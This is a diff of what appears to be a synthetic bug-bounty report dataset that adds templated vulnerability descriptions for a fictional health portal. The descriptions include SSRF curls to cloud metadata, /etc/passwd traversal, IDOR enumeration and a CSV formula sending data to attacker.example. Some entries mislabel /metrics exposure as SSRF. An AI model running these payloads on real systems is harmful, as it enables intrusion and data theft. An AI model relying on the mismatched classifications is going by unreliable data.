           "offset": "4d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11538,7 +11625,8 @@
           "offset": "7d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.seefjord-health.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11669,7 +11757,8 @@
           "offset": "3d 17h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.seefjord-health.foo/profile`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11808,7 +11897,8 @@
           "offset": "3d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11908,7 +11998,8 @@
           "offset": "6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12043,7 +12134,8 @@
           "offset": "4d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12151,7 +12243,8 @@
           "offset": "3d 22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.seefjord-health.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12254,7 +12347,8 @@
           "offset": "3d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12430,7 +12524,8 @@
           "offset": "8d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12509,7 +12604,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12632,7 +12728,8 @@
           "offset": "4d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.seefjord-health.foo/profile`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12790,7 +12887,8 @@
           "offset": "5d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12934,7 +13032,8 @@
           "offset": "3d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.seefjord-health.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13054,7 +13153,8 @@
           "offset": "1d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13174,7 +13274,8 @@
           "offset": "17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13313,7 +13414,8 @@
           "offset": "5d 19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13461,7 +13563,8 @@
           "offset": "7d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13631,7 +13734,8 @@
           "offset": "6d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13771,7 +13875,8 @@
           "offset": "3d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13930,7 +14035,8 @@
           "offset": "6d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14105,7 +14211,8 @@
           "offset": "7d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.seefjord-health.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14229,7 +14336,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14372,7 +14480,8 @@
           "offset": "2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14494,7 +14603,8 @@
           "offset": "3d 7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.seefjord-health.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14649,7 +14759,8 @@
           "offset": "7d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.seefjord-health.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14751,7 +14862,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14906,7 +15018,8 @@
           "offset": "6d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15053,7 +15166,8 @@
           "offset": "7d 6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.seefjord-health.foo/profile`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15207,7 +15321,8 @@
           "offset": "8d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15321,7 +15436,8 @@
           "offset": "11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15500,7 +15616,8 @@
           "offset": "7d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.seefjord-health.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15615,7 +15732,8 @@
           "offset": "2d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
